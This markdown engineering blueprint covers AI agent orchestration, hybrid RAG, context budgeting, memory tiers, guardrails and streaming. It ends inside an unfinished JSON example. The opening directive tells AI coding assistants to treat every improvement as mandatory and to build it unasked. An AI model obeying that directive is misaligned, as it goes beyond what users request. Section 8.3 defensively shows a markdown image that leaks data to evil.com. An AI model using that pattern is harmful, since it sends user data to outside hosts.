# Enterprise Blueprint: AI Agent Runtime, Hybrid RAG & Context Engineering

> **System Directive for AI Coding Assistants (Antigravity):**  
> This document serves as the authoritative architectural source of truth for designing, implementing, and scaling AI Agent Runtimes, Retrieval-Augmented Generation (RAG) pipelines, and Context Engineering systems in production web applications.  
>
> **Strict Classification Rules:**
> 1. **`[MANDATORY]`**: Any architecture, pattern, security guardrail, performance optimization, observability hook, or UX enhancement that improves the reliability, accuracy, speed, scalability, or professionalism of the web application. **Nothing that improves the web application is considered optional.** You must implement or scaffold these patterns by default.
> 2. **`[ACCORDING TO PS]` (According to Problem Statement)**: Components, domain topologies, visual themes, specialized parsers, or business-logic triggers that depend directly on the specific use case, target industry, or user problem statement. You must evaluate the project's problem statement before selecting the concrete implementation for these items.

---

## 1. Executive Classification Matrix

| Architectural Pillar | Core Sub-System | Requirement Status | Rationale |
| :--- | :--- | :--- | :--- |
| **Agent Orchestration** | Stateful Graph Runtime (LangGraph), Typed State Schemas, Loop Caps, Time-Travel Checkpoints | **`[MANDATORY]`** | Prevents infinite loops, ensures deterministic state transitions, and enables crash recovery. |
| **Agent Orchestration** | Specific Multi-Agent Topology (Supervisor-Worker vs. Hierarchical vs. Swarm) & Domain Personas | **`[ACCORDING TO PS]`** | The number of agents and their hierarchy depend on the complexity of the domain workflow. |
| **Human-in-the-Loop** | Interrupt Infrastructure, State Persistence on Pause, Resume/Reject API Endpoints | **`[MANDATORY]`** | Essential for high-agency web apps to safely pause execution without holding open HTTP threads. |
| **Human-in-the-Loop** | Specific Approval Triggers (e.g., financial transactions $\$ > 500$, database `DELETE`, external emails) | **`[ACCORDING TO PS]`** | Business risk thresholds are dictated by the specific domain and problem statement. |
| **AI Gateway & Routing** | Unified Proxy (LiteLLM/Custom), Multi-Provider Failover, Circuit Breakers, Strict JSON Schema Validation | **`[MANDATORY]`** | Eliminates single-provider downtime and guarantees type-safe tool execution. |
| **AI Gateway & Routing** | Model Selection Matrix (e.g., Claude 3.7 Sonnet vs. GPT-4o vs. local vLLM/Llama-3 for air-gapped compliance) | **`[ACCORDING TO PS]`** | Dictated by budget constraints, latency SLAs, data privacy regulations, and reasoning needs. |
| **Hybrid RAG Pipeline** | Semantic/Contextual Chunking, Dense + BM25 Lexical Search, RRF Fusion, Cross-Encoder Reranking, Inline Citations | **`[MANDATORY]`** | Naive vector-only RAG fails on exact keywords, acronyms, and multi-hop precision; citations build user trust. |
| **Hybrid RAG Pipeline** | Specialized Ingestion Parsers (e.g., OCR for scanned PDFs, DICOM medical parsers, AST code splitters, Neo4j GraphRAG) | **`[ACCORDING TO PS]`** | Determined by the input data modalities defined in the problem statement. |
| **Context Engineering** | Dynamic Token Budgeting, Observation Masking, Prompt Caching, XML-Delimited Modular System Prompts | **`[MANDATORY]`** | Prevents context window overflow, reduces TTFT (Time-To-First-Token) latency, and prevents instruction drift. |
| **Multi-Tier Memory** | Short-Term Redis Checkpoints + Long-Term Postgres/Vector Entity & Episodic Memory + Background Consolidation | **`[MANDATORY]`** | Transforms a stateless chatbot into a personalized, stateful cognitive web platform. |
| **Security & Guardrails** | Prompt Injection Defense, Document-Level RBAC/ACL Pre-Filtering, PII Redaction, Output Groundedness Checks | **`[MANDATORY]`** | Non-negotiable for enterprise security and multi-tenant data isolation. |
| **Web UX & Streaming** | SSE/Data-Stream Protocol, Granular Step/Thought Indicators, Interactive Citation Previews, Optimistic UI | **`[MANDATORY]`** | Directly dictates perceived performance and professional polish of the web application. |
| **Web UX & Design** | Color Palette, Typography, Domain Layout (Canvas vs. Dashboard vs. Copilot Sidebar), Brand Voice | **`[ACCORDING TO PS]`** | Aesthetic direction, theming, and workspace layout must match the target user persona and problem statement. |

---

## 2. Stateful Multi-Agent Orchestration & Runtime Engine

Modern AI web applications must never rely on brittle `while` loops or unconstrained autonomous scripts. They require a **stateful, graph-based orchestration runtime** (such as LangGraph or an equivalent Directed Cyclic Graph state machine).

### 2.1 Directed Cyclic Graphs (DCGs) & State Machines `[MANDATORY]`
Unlike traditional DAGs (Directed Acyclic Graphs) used in data pipelines, agentic workflows require controlled **cycles** for iterative reasoning, self-correction, tool-error recovery, and retrieval grading.
*   **Nodes**: Pure or asynchronous functions representing discrete cognitive steps (e.g., `router_node`, `retrieval_node`, `tool_executor_node`, `reflection_node`, `synthesizer_node`). Every node accepts the current `State` and returns a partial state update.
*   **Edges**: Deterministic transitions (Node $A \rightarrow$ Node $B$) or **Conditional Edges** driven by routing functions that inspect the state (e.g., if `tool_calls` exist $\rightarrow$ `tool_executor_node`; if `validation_error` $\rightarrow$ `self_correction_node`; else $\rightarrow$ `END`).

### 2.2 Explicit State Schemas & State Reducers `[MANDATORY]`
State must never be passed as untyped dictionaries.
*   **Strict Typing**: Define explicit state schemas using `TypedDict`, `Pydantic BaseModel`, or `Zod` (in TypeScript).
*   **State Reducers**: Explicitly define how partial updates from parallel or sequential nodes merge into the global state:
    *   *Append-Only Reducer (`add_messages`)*: Used for conversation history, preserving message IDs and supporting targeted message updates/deletions.
    *   *Overwrite Reducer*: Used for current step indicators, active query strings, or loop counters.
    *   *Custom Merge/Deduplication Reducer*: Used for accumulating retrieved RAG chunks across multiple search iterations without duplicating document IDs.
*   **Input / Output / Private State Separation**:
    *   `InputState`: Clean external contract exposed to the REST/SSE API.
    *   `OverallState`: Internal shared scratchpad containing intermediate thoughts, raw tool payloads, and retry counters.
    *   `OutputState`: Sanitized final payload returned to the client.

### 2.3 Multi-Agent Topologies `[ACCORDING TO PS]`
Select the orchestration topology based on the problem statement's domain requirements:
1.  **Supervisor-Worker Pattern**: A central Supervisor node evaluates the user's goal, decomposes tasks, and routes execution to specialized worker agents (e.g., `ResearchAgent`, `SQLAgent`, `CodeAgent`, `ComplianceAgent`). Workers report back strictly to the Supervisor until the Supervisor emits `FINISH`.
2.  **Hierarchical Teams (Supervisor of Supervisors)**: Used when the problem statement spans distinct organizational domains (e.g., an Engineering sub-graph and a Marketing sub-graph managed by a top-level Executive Router).
3.  **Network / Swarm Handoff Pattern**: Decentralized architecture where active agents dynamically transfer control directly to peer agents via explicit handoff tools (e.g., `transfer_to_billing_agent(context)`), ideal for customer-service conversational flows.
4.  **Plan-and-Execute (Planner $\rightarrow$ Executor $\rightarrow$ Replanner)**: An explicit Planner generates a multi-step DAG; worker nodes execute steps in parallel where possible; a Replanner evaluates outputs and updates the remaining plan.

### 2.4 Execution Control, Loop Caps & Deadlock Prevention `[MANDATORY]`
Unbounded cyclic graphs risk infinite token burn and hung requests.
*   **Hard Recursion Limits**: Enforce a strict `recursion_limit` (e.g., $N_{\text{max}} = 25$ super-steps) at the graph runtime level.
*   **Per-Node Retry & Loop Caps**: Track `reflection_count` and `tool_retry_count` inside the state schema. Enforce a conditional termination rule: if `retry_count` $\ge 3$, bypass the failing tool and route directly to a `graceful_fallback_node` that informs the user of partial results.
*   **Wall-Clock Timeouts & Cancellation Tokens**: Propagate `AbortSignal` / `asyncio.CancelledError` from the client HTTP connection all the way down to active LLM calls and sub-agent tasks if the user clicks "Stop Generating."
*   **Cycle Detection (Semantic Loop Breaker)**: Hash consecutive tool calls (`tool_name + canonical_json(args)`). If an agent invokes the exact same tool with identical arguments twice within a turn, intercept the call and inject a system error message forcing a different strategy.

### 2.5 Human-in-the-Loop (HITL) & Interrupt Architecture
*   **Interrupt Mechanics `[MANDATORY]`**:
    *   Use static (`interrupt_before`, `interrupt_after`) or dynamic (`interrupt(payload)`) breakpoints before high-consequence execution nodes.
    *   When an interrupt triggers, serialize the entire graph state to the checkpointer (Redis/PostgreSQL), close the active compute worker cleanly, and emit an `awaiting_approval` SSE event containing the proposed tool call, parameters, and diff preview.
    *   Provide dedicated resumption mechanics:
        1. **`Approve`**: Resume graph execution from the exact checkpoint with `Command(resume=True)`.
        2. **`Edit / Modify`**: Allow the user to edit the tool arguments in the UI (e.g., modifying an email draft or SQL filter), update the state via `update_state()`, and resume.
        3. **`Reject with Feedback`**: Inject a synthetic `ToolMessage` stating *"Action rejected by user with reason: [X]"* and route back to the reasoning node to adjust the plan.
*   **HITL Trigger Policies `[ACCORDING TO PS]`**:
    *   Read-only operations (search, RAG retrieval, analytics queries) run autonomously.
    *   Write/Mutating operations (database writes, external API POST/DELETE, payment execution, publishing content) require mandatory HITL approval based on domain risk rules defined in the problem statement.

### 2.6 Time-Travel, State Replay & Thread Forking `[MANDATORY]`
*   Every super-step in the graph must generate an immutable `checkpoint_id` linked to its `parent_checkpoint_id`.
*   **User Branching**: Enable users in the web UI to edit a previous message or regenerate an earlier turn, creating a new branch from that historical `checkpoint_id` without destroying the original conversation thread.

---

## 3. Unified AI Gateway, Model Routing & Resilience

Production web applications must never hardcode direct vendor SDK calls (e.g., raw `openai.chat.completions.create`) scattered across business logic. All model invocations must pass through a centralized **Unified AI Gateway** (e.g., LiteLLM Proxy, Portkey, or a custom unified router service).

### 3.1 Multi-Provider Abstraction & Dynamic Routing
*   **Standardized Interface `[MANDATORY]`**: Normalize all requests, tool definitions, streaming chunks, and token usage metrics across OpenAI, Anthropic, AWS Bedrock, Google Vertex AI, and self-hosted vLLM/Ollama endpoints into a single canonical interface.
*   **Tiered Model Routing Matrix `[MANDATORY Architecture / Specific Models ACCORDING TO PS]`**:
    *   **Tier 1 — Fast / Low-Cost Router & Classifier Models** (e.g., Gemini 2.5 Flash, Claude 3.5 Haiku, GPT-4o-mini): Used for intent classification, query expansion, metadata extraction, guardrail checks, and memory summarization. Target TTFT $\le 300\text{ ms}$.
    *   **Tier 2 — Primary Workhorse Models** (e.g., Claude 3.7 Sonnet, GPT-4o, Gemini 2.5 Pro): Used for complex multi-step tool orchestration, code synthesis, and final RAG response synthesis.
    *   **Tier 3 — Deep Reasoning Models** (e.g., OpenAI o3-mini / o1, Claude 3.7 Sonnet with Extended Thinking): Used selectively for architectural planning, mathematical proofs, or complex root-cause debugging.

### 3.2 High-Availability Resilience & Failover Engineering `[MANDATORY]`
*   **Instant Cross-Provider Failover**: Configure primary and fallback provider chains. For example:
    $$\text{Anthropic API (Primary)} \xrightarrow{\text{HTTP } 429 / 503 / \text{Timeout}} \text{AWS Bedrock Anthropic (Fallback 1)} \xrightarrow{\text{Failure}} \text{OpenAI GPT-4o (Fallback 2)}$$
*   **Exponential Backoff with Full Jitter**: For transient rate limits (`HTTP 429`), compute retry delay as:
    $$t_{\text{sleep}} = \text{random}\left(0, \min\left(t_{\text{max}}, t_{\text{base}} \cdot 2^{\text{attempt}}\right)\right)$$
*   **Circuit Breakers**: Track rolling failure rates per provider deployment in Redis. If error rate exceeds $20\%$ over a $60\text{-second}$ window, trip the circuit breaker to `OPEN` and route $100\%$ of traffic to the secondary provider immediately without waiting for timeouts.
*   **Hedging Requests**: For latency-critical routing nodes, fire a secondary hedged request if the primary request exceeds the $p_{95}$ latency threshold.

### 3.3 Strict Structured Outputs & Self-Correcting Tool Calls `[MANDATORY]`
*   **Constrained Decoding**: Always use native structured output modes (`response_format` with strict JSON Schema or Anthropic tool-use enforcement) backed by Pydantic/Zod schemas.
*   **Validation & Repair Loop**: Never crash the web request on a malformed JSON or schema violation. Wrap schema parsing in a self-correction middleware:
    1. Parse LLM output against Pydantic/Zod schema.
    2. If `ValidationError` is raised, serialize the exact field error details and feed them back to the model in a lightweight repair turn (up to $2$ retries) before failing over.

### 3.4 Multi-Layer Caching & FinOps Cost Controls `[MANDATORY]`
*   **Provider Prefix Caching**: Structure prompts so static content (System Instructions, Tool Schemas, Few-Shot Examples, and core Project Context) resides strictly at the beginning of the prompt prefix, enabling automatic $50\%\text{–}90\%$ token discounts and latency reductions via Anthropic/OpenAI prompt caching.
*   **Semantic Caching**: Maintain a Redis Vector cache of recent `(query_embedding, tenant_id, access_scope)` tuples. If a new query has cosine similarity $\cos(\theta) \ge 0.96$ with a cached entry and references unmodified underlying documents, serve the cached response immediately.
*   **Per-Tenant / Per-User Token Budgets**: Track cumulative token consumption and USD cost in real time. Enforce daily/monthly hard and soft quotas per user tier to prevent abuse.

---

## 4. Production-Grade Hybrid RAG Pipeline

Naive RAG (splitting text by fixed character count and running top-$k$ cosine similarity) is unacceptable for professional web applications. You must implement an **Agentic Hybrid RAG Pipeline**.

```
[Document Ingestion] -> [Layout-Aware Parsing] -> [Contextual Semantic Chunking]
                                                            |
                       +------------------------------------+------------------------------------+
                       |                                                                         |
                       v                                                                         v
          [Dense Vector Embeddings]                                                [Sparse BM25 / SPLADE Index]
        (pgvector HNSW / Qdrant / Chroma)                                         (Postgres tsvector / Tantivy)
                       |                                                                         |
                       +------------------------------------+------------------------------------+
                                                            |
                                                            v
[User Query] -> [Query Rewriting / HyDE / Filters] -> [Reciprocal Rank Fusion (RRF)]
                                                            |
                                                            v
                                             [Cross-Encoder Reranking (Top-N -> Top-K)]
                                                            |
                                                            v
                                             [Relevance Grading & Hallucination Check]
                                                            |
                                                            v
                                       [Synthesizer with Deterministic Inline Citations]
```

### 4.1 Ingestion, ETL & Layout-Aware Parsing
*   **Layout-Aware Document Parsing `[MANDATORY]`**: Never use basic text extractors (`PyPDF2`) that scramble multi-column layouts and tables. Use layout-aware parsers (e.g., Docling, Unstructured, LlamaParse, or Vision-LLM extraction) that preserve document hierarchy (Headers $H_1 \rightarrow H_6$), convert tables into clean Markdown/HTML structures, and extract figure captions.
*   **Domain-Specific Modality Parsers `[ACCORDING TO PS]`**:
    *   *Codebases*: Use Tree-sitter AST (Abstract Syntax Tree) parsing to chunk by complete classes, functions, and interfaces along with their import dependencies.
    *   *Financial/Legal*: Preserve exact page numbers, line numbers, footnote bindings, and tabular numerical precision.
    *   *Multimedia*: Whisper ASR with speaker diarization and timestamp alignment for audio/video ingestion.
*   **Incremental Indexing & Deduplication `[MANDATORY]`**: Compute SHA-256 content hashes at both the document and chunk level. Only re-embed and upsert chunks whose hashes have changed during document updates, preventing duplicate vectors and wasted embedding cost.

### 4.2 Advanced Chunking & Contextual Retrieval `[MANDATORY]`
*   **Semantic & Structure-Aware Chunking**: Split documents primarily along structural boundaries (Markdown headers, sections, paragraphs) and semantic shifts (measuring cosine distance between adjacent sentence embeddings and splitting when distance exceeds the $90\text{th}$ percentile threshold).
*   **Parent-Child (Small-to-Big) Indexing**: Index small, granular child chunks ($150\text{–}250$ tokens) for high-precision vector matching, but link each child chunk via `parent_id` to a broader parent section ($800\text{–}1,500$ tokens). Retrieve the parent chunk into the LLM context so the model has full surrounding context.
*   **Anthropic-Style Contextual Retrieval**: During ingestion, pass each chunk alongside the full document summary to a fast Tier-1 model to generate a concise $50\text{-token}$ contextual prefix (e.g., *"This chunk is from Acme Corp's Q3 2026 SEC 10-Q filing, Section 4 on Revenue Recognition..."*) and prepend it to the chunk **before** generating both dense embeddings and BM25 lexical indices.

### 4.3 Hybrid Retrieval: Dense Vector + Sparse Lexical Search `[MANDATORY]`
Dense embeddings excel at semantic/conceptual similarity but fail at exact part numbers, SKUs, function names, acronyms, and proper nouns. Sparse BM25 excels at exact lexical tokens. Both must run in parallel.
*   **Dense Vector Store**: `pgvector` (using `HNSW` index with `m = 16`, `ef_construction = 64`), Qdrant, or ChromaDB. Distance metric: Cosine similarity:
    $$\text{sim}_{\text{dense}}(\mathbf{q}, \mathbf{d}) = \frac{\mathbf{q} \cdot \mathbf{d}}{\|\mathbf{q}\| \|\mathbf{d}\|}$$
*   **Sparse Lexical Index**: BM25 (via PostgreSQL `tsvector`/`pg_search`, ParadeDB, Qdrant sparse vectors, or Elasticsearch):
    $$\text{BM25}(D, Q) = \sum_{i=1}^{n} \text{IDF}(q_i) \cdot \frac{f(q_i, D) \cdot (k_1 + 1)}{f(q_i, D) + k_1 \cdot \left(1 - b + b \cdot \frac{|D|}{\text{avgdl}}\right)}$$
*   **Reciprocal Rank Fusion (RRF) `[MANDATORY]`**: Because raw cosine similarity scores and unbounded BM25 scores exist on incompatible scales, merge the top $N = 50$ dense results and top $N = 50$ sparse results using Reciprocal Rank Fusion:
    $$\text{RRF\_Score}(d \in D) = \sum_{m \in \{\text{dense}, \text{sparse}\}} \frac{1}{k + r_m(d)}$$
    where $r_m(d)$ is the $1$-based rank of document $d$ in retrieval system $m$, and $k = 60$ is the smoothing constant.

### 4.4 Pre-Retrieval Query Transformation `[MANDATORY]`
User queries in web interfaces are often ambiguous, conversational, or compound ("How does it compare to last year?"). Before hitting the vector store:
1.  **Conversational Query Contextualization**: Rewrite pronouns and implicit references using recent chat history into a standalone search query.
2.  **Multi-Query Decomposition**: Break complex multi-part questions into $2\text{–}4$ atomic sub-queries executed concurrently via `asyncio.gather` / `Promise.all`.
3.  **Self-Querying Metadata Extraction**: Extract structured metadata filters from natural language (e.g., extracting `year >= 2025` and `department == 'legal'`) and apply them as hard SQL/Vector `WHERE` pre-filters.
4.  **HyDE (Hypothetical Document Embeddings) `[ACCORDING TO PS]`**: For zero-shot technical or abstract domains where query-to-document vocabulary mismatch is high, generate a brief hypothetical answer snippet and embed that snippet for dense retrieval.

### 4.5 Post-Retrieval Cross-Encoder Reranking & Context Ordering `[MANDATORY]`
*   **Cross-Encoder Reranking**: Bi-encoder embeddings compress query and document separately, losing fine-grained token interaction. Pass the top $30\text{–}50$ RRF-fused candidates through a Cross-Encoder Reranker (e.g., Cohere Rerank v3.5, `bge-reranker-v2-m3`, or Mixedbread) and select the top $K = 5\text{–}10$ chunks exceeding a minimum relevance threshold ($\tau_{\text{rerank}} \ge 0.25$).
*   **Lost-in-the-Middle Reordering**: LLMs exhibit a U-shaped attention curve, attending strongest to the very beginning and very end of retrieved context. Reorder the final top-$K$ chunks so the highest-scoring chunks are placed at positions $1$ and $K$, with lower-scoring supporting chunks in the middle.

### 4.6 Agentic & Corrective RAG (CRAG / Self-RAG) `[MANDATORY]`
Never blindly stuff retrieved chunks into the prompt if they are irrelevant.
*   **Retrieval Grader Node**: Evaluate whether retrieved chunks actually contain evidence to answer the query.
*   **Query Rewrite & Fallback Loop**: If the grader determines chunks are irrelevant:
    1. Rewrite the search query (broadening or shifting terminology) and retry retrieval once.
    2. If internal retrieval still fails (and permitted by the problem statement), trigger a fallback Web Search tool (Tavily / Exa / Perplexity) or explicitly inform the user that the knowledge base lacks the verified information.
*   **GraphRAG Integration `[ACCORDING TO PS]`**: When the problem statement requires global thematic queries across thousands of documents or multi-hop relational traversal (e.g., supply-chain dependencies, fraud rings, biomedical pathways), pair vector retrieval with a Knowledge Graph (Neo4j / FalkorDB) extracting `(Subject) -[Predicate]-> (Object)` triples.

### 4.7 Deterministic Inline Source Citations & Provenance `[MANDATORY]`
Hallucinated URLs or unverified citations destroy application credibility.
*   **Integer Citation Indexing**: Format retrieved chunks in the prompt with strict XML blocks and integer IDs:
    ```xml
    <documents>
      <document id="1" source="Q3_Financial_Report.pdf" page="14" chunk_id="chk_98a7f">
        <content>Exact text of the retrieved chunk...</content>
      </document>
    </documents>
    ```
*   **Strict Citation Prompting & Post-Processing**: Instruct the LLM to cite claims strictly using `[1]`, `[2]` syntax immediately following the clause. On the backend/frontend, map `[1]` deterministically to the metadata of `<document id="1">` (title, URL, page number, exact character offsets, and highlighted quote snippet). Never allow the LLM to generate raw URLs from memory.

---

## 5. Context Engineering & Prompt Architecture

Context Engineering is the discipline of dynamically assembling the exact right information, tools, memory, and instructions into the LLM's finite attention window at every step of execution.

### 5.1 Dynamic Token Budgeting & Allocation `[MANDATORY]`
Treat the LLM context window as a strict memory budget governed by the invariant:
$$T_{\text{system}} + T_{\text{tools}} + T_{\text{memory}} + T_{\text{RAG}} + T_{\text{history}} + T_{\text{output\_reserve}} \le T_{\text{effective\_limit}}$$
*   **Effective Context Limit ($T_{\text{effective\_limit}}$)**: Even if a model advertises a $200\text{k}$ or $1\text{M}$ token window, reasoning accuracy degrades ("context rot") and latency/cost scale significantly past $32\text{k}\text{–}64\text{k}$ tokens. Set a practical soft budget (e.g., $32,000$ tokens) and allocate deterministic ceilings per section (e.g., System: $2\text{k}$, Tools: $3\text{k}$, Memory: $2\text{k}$, RAG Chunks: $12\text{k}$, Conversation History: $8\text{k}$, Output Reserve: $5\text{k}$).

### 5.2 Context Window Compaction & Observation Masking `[MANDATORY]`
*   **Observation Masking (Tool Output Trimming)**: Tool outputs (e.g., large JSON responses, scraped webpages, SQL rows) quickly bloat the state history. Store the raw, full tool output in external storage (Redis/S3/Postgres) referenced by a `blob_id`, inject only a summarized/relevant slice into the LLM's message history, and strip raw tool payloads from turns older than $N = 3$ steps.
*   **Rolling Summarization with Pinning**: Keep the system prompt, pinned core instructions, and the most recent $K = 6\text{–}10$ raw conversational turns intact. When older messages exceed $T_{\text{history}}$, asynchronously compress the oldest turns into a structured `<conversation_summary>` block.

### 5.3 Modular XML-Delimited Prompt Architecture `[MANDATORY]`
Never use unstructured walls of text for prompts. Construct prompts programmatically from versioned templates using clean structural boundaries:
```xml
<system_identity>
  <!-- Role, core objective, tone [ACCORDING TO PS] -->
</system_identity>

<operational_constraints>
  <!-- Grounding rules, citation format, refusal policies, safety guardrails [MANDATORY] -->
</operational_constraints>

<user_memory_context>
  <!-- Dynamically injected long-term facts, preferences, and active entities [MANDATORY] -->
</user_memory_context>

<retrieved_knowledge>
  <!-- Top-K reranked RAG chunks with citation IDs [MANDATORY] -->
</retrieved_knowledge>

<execution_scratchpad>
  <!-- Current plan state, completed steps, remaining sub-goals [MANDATORY] -->
</execution_scratchpad>
```

### 5.4 Dynamic Tool Filtering (Contextual Tool Routing) `[MANDATORY]`
When an application registers more than $15\text{–}20$ tools, passing all tool schemas on every turn confuses the LLM's tool selection accuracy and wastes thousands of input tokens.
*   Bind only the $5\text{–}8$ tools relevant to the active sub-agent node, or run a fast semantic similarity lookup over tool descriptions based on the user's intent before binding tools for that turn.

---

## 6. Multi-Tier Agent Memory Architecture

A production agent requires a cognitive memory hierarchy modelled after human memory systems, bridging ultra-fast in-flight state with persistent cross-session knowledge.

| Memory Tier | Cognitive Analog | Storage Engine | Scope & TTL | Primary Purpose | Status |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **Tier 1: Working Memory** | Prefrontal Scratchpad | In-Memory Graph State | Single Turn / Execution Run | Holds active sub-goals, tool arguments, and intermediate reasoning tokens. | **`[MANDATORY]`** |
| **Tier 2: Short-Term Memory** | Episodic Buffer | Redis (`AsyncRedisSaver`) | Thread-Scoped (TTL: $24\text{h}\text{–}7\text{d}$ hot, archived to Postgres) | Checkpoints full LangGraph thread state, enabling multi-turn continuity and HITL resume. | **`[MANDATORY]`** |
| **Tier 3: Long-Term Semantic** | Fact & Profile Store | PostgreSQL (`JSONB` + `pgvector`) | User / Organization Global (Permanent) | Stores extracted user preferences, domain entities, project rules, and structured facts. | **`[MANDATORY]`** |
| **Tier 4: Long-Term Episodic** | Past Experience Recall | Vector DB (`pgvector` / Qdrant) | User / Agent Scoped (Permanent) | Stores vectorized summaries of past successful trajectories and resolved sessions for dynamic few-shot recall. | **`[MANDATORY]`** |
| **Tier 5: Procedural Memory** | Learned Skills & Playbooks | Versioned Prompt/Rule Registry | System / Tenant Global | Stores refined system instructions, domain SOPs, and validated tool workflows. | **`[ACCORDING TO PS]`** |

### 6.1 Short-Term Thread Checkpointing (Redis + Postgres Tiering) `[MANDATORY]`
*   **Write-Through / Write-Behind Checkpointing**: Store active thread checkpoints in Redis for sub-millisecond read/write latency during active streaming turns, and asynchronously persist completed turn checkpoints to PostgreSQL for durable long-term thread history.
*   **Concurrency & Optimistic Locking**: Use Redis distributed locks (`SET resource_name my_random_value NX PX 30000`) per `thread_id` to prevent race conditions if a user double-submits messages in the same thread simultaneously.

### 6.2 Long-Term Fact Extraction & Conflict Resolution `[MANDATORY]`
Never block the main user response stream to write long-term memories.
*   **Asynchronous Background Memory Worker**: After a conversation turn completes, emit an event to a background queue (BullMQ / Celery / Temporal). A background worker analyzes the turn to extract new facts, preferences, or entity updates.
*   **Memory Consolidation (ADD / UPDATE / DELETE / NOOP)**: Before inserting a new memory fact, query existing memories for the user. Pass the existing related memories and the newly extracted fact to a fast model to resolve contradictions:
    *   *Example*: If existing memory states `"User prefers Python 3.10"` and the user says `"We migrated everything to Python 3.12"`, execute an `UPDATE` (or mark the old fact `valid_until = NOW()` and insert the new fact with `valid_from = NOW()`) rather than keeping contradictory duplicates.

### 6.3 Composite Memory Retrieval Scoring `[MANDATORY]`
When retrieving long-term memories to inject into the context window, rank memories using a weighted composite score of **Recency**, **Importance**, and **Semantic Relevance**:
$$S_{\text{memory}}(m, q) = w_{\text{rec}} \cdot \gamma^{\Delta t(m)} + w_{\text{imp}} \cdot I(m) + w_{\text{rel}} \cdot \cos\left(\mathbf{e}_q, \mathbf{e}_m\right)$$
where:
*   $\Delta t(m)$ is the hours elapsed since memory $m$ was last accessed, and $\gamma \in (0, 1)$ is the exponential decay factor (e.g., $\gamma = 0.995$).
*   $I(m) \in [0, 1]$ is the normalized importance score assigned at extraction time.
*   $\cos(\mathbf{e}_q, \mathbf{e}_m)$ is the cosine similarity between the current query embedding and the memory embedding.

### 6.4 Memory Privacy, Tenant Isolation & Governance `[MANDATORY]`
*   Every memory record must enforce composite indexing on `(tenant_id, user_id, namespace)`.
*   Provide a dedicated **Memory Management UI** in the web application allowing users to view, edit, or delete specific facts the AI remembers about them (ensuring full transparency and GDPR compliance).

---

## 7. Tool Engineering, Sandboxing & External Integrations

### 7.1 Model Context Protocol (MCP) & Tool Contracts `[MANDATORY]`
*   Design external tool integrations following the **Model Context Protocol (MCP)** standard (`Resources`, `Prompts`, `Tools`), allowing the agent runtime to connect cleanly to databases, GitHub, Slack, file systems, or domain APIs via standardized JSON-RPC interfaces.
*   **LLM-Ergonomic Tool Design**:
    *   Write clear, unambiguous docstrings specifying *when* to use the tool, *when not* to use it, and the exact format of parameters.
    *   Enforce **Idempotency Keys** on all mutating tool calls so network retries never create duplicate records or double charges.
    *   **Informative Error Returns**: If a tool fails due to bad parameters (e.g., invalid SQL column name or date format), return a structured error string containing the valid schema/options so the agent can self-correct on the next step rather than throwing an unhandled `500` exception.

### 7.2 Secure Code Execution & Sandboxing `[MANDATORY if Code/Data-Analysis Execution is Enabled / ACCORDING TO PS]`
If the problem statement includes data analysis, charting, code generation/execution, or file manipulation:
*   **Zero Host Execution**: Never run `eval()`, `exec()`, or raw `subprocess` on the application server.
*   **Isolated MicroVM Sandboxes**: Execute all agent-generated code inside ephemeral, network-restricted microVMs or containers (e.g., E2B, Modal Sandboxes, Firecracker, or gVisor) with strict CPU, memory ($512\text{ MB}$), and execution timeout ($30\text{s}$) limits.

### 7.3 Least-Privilege Auth & Secret Isolation `[MANDATORY]`
*   **Zero Secret Exposure in Context**: Never pass API keys, JWTs, or database credentials inside the LLM prompt or tool arguments generated by the LLM.
*   **Runtime Context Injection**: Inject scoped user credentials (`user_id`, `tenant_id`, OAuth access tokens) via immutable runtime configuration (`RunnableConfig` / server-side session context) directly inside the tool execution wrapper after the LLM emits the tool call.

---

## 8. Security, Guardrails & Trust Architecture

### 8.1 Input Guardrails (Pre-LLM Execution) `[MANDATORY]`
Run lightweight, low-latency parallel checks ($\le 50\text{ ms}$) before invoking primary orchestration models:
1.  **Prompt Injection & Jailbreak Detection**: Screen untrusted user inputs and external retrieved content (indirect prompt injection) using fast classifiers (e.g., Llama Guard, Lakera, or heuristic/embedding classifiers).
2.  **PII Detection & Redaction**: Detect and mask sensitive PII (SSNs, credit cards, raw API keys, health identifiers via Microsoft Presidio or regex/NER pipelines) before sending payloads to external LLM providers. Can optionally re-hydrate masked tokens (`<PERSON_1>`) on the way back to the authenticated user.
3.  **Topic & Scope Railroading `[ACCORDING TO PS]`**: Reject off-topic queries immediately at the edge according to the application's domain boundaries.

### 8.2 Document-Level RBAC / ACL Pre-Filtering in RAG `[MANDATORY]`
*   **Pre-Retrieval Security Enforcement**: Access control must **never** be enforced by asking the LLM to "ignore unauthorized documents" or by filtering after top-$K$ vector search (which causes recall starvation if top results belong to other tenants).
*   Every vector chunk in `pgvector`/Qdrant must store `tenant_id` and `allowed_role_ids` / `access_control_list`. Every hybrid query must inject a mandatory hard filter:
    ```sql
    WHERE tenant_id = $1 AND allowed_roles && $2::text[]
    ```

### 8.3 Output Guardrails (Post-LLM Validation) `[MANDATORY]`
*   **Hallucination & Groundedness Verification**: For high-stakes domains, verify that every factual claim and numerical figure in the generated response is entailed by the retrieved `<documents>`.
*   **Data Exfiltration Prevention**: Scan outbound markdown links and image tags (`![img](https://evil.com?leak=...)`) generated by the LLM to prevent markdown-based data exfiltration attacks. Strip or block unverified external image domains via strict Content Security Policy (CSP).

---

## 9. Real-Time Streaming, Web UX & Frontend Architecture

A brilliant backend agent feels broken if the web interface freezes behind a spinner for $15\text{ seconds}$. The frontend and streaming layer must provide immediate, transparent cognitive feedback.

### 9.1 Streaming Protocols & Multi-Channel Event Architecture `[MANDATORY]`
Use **Server-Sent Events (SSE)** over HTTP/2 or the **Vercel AI SDK Data Stream Protocol** to multiplex distinct event channels over a single connection:
```json
// 1. Agent Lifecycle & Node Transitions
{"type": "agent_step", "node": "supervisor", "status": "routing", "target": "sql_analyst_agent", "timestamp": 1763054000}

// 2. Reasoning / Thought Stream (Collapsible in UI)
{"type": "reasoning_delta", "delta": "Analyzing Q3 revenue variance across APAC regions..."}

// 3. Tool Call Execution & Progress
{"type": "tool_call_start", "tool_call_id": "call_01", "name": "hybrid_rag_search", "args": {"query": "Q3 APAC revenue recognition"}}
{"type": "tool_call_result", "tool_call_id": "call_01", "status": "success", "summary": "Retrieved 6 verified chunks from 2 documents (42ms)"}

// 4. Verified Source Citations Payload
{"type": "citations", "sources": [{"id": 1, "title": "Q3_10Q.pdf", "page": 14, "snippet": "APAC revenue grew 18% YoY..."}]}

// 5. Token-by-Token Final Content Stream
{"type": "text_delta", "delta": "Based on the Q3 filing [1], APAC revenue increased by "}
